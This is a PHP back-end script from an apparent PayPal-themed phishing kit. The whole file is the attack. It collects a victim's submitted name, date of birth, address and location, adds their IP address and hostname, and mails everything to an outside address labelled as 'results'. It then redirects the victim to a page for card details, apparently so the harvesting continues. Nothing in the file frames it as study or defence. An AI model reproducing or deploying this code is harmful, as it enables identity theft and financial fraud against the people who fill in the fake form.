<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------|paypal|--------------|\n";
$message .= "|First Name: ".$_POST['first']."\n";
$message .= "|Last Name : ".$_POST['last']."\n";
$message .= "|Date of Birth: ".$_POST['date']."\n";
$message .= "|Address   : ".$_POST['address']."\n";
$message .= "|Address2  : ".$_POST['address1']."\n";
$message .= "|country   : ".$_POST['country']."\n";
$message .= "|city      : ".$_POST['city']."\n";
$message .= "|state     : ".$_POST['state']."\n";
$message .= "|zip code  : ".$_POST['code']."\n";
$message .= "|---------------|Info|-------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------|paypal|--------------|\n";
$send = "spamiarskie@wp.pl";
$subject = "~ ResuLtaT PpL ~ | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:../Card_Details.html");
?>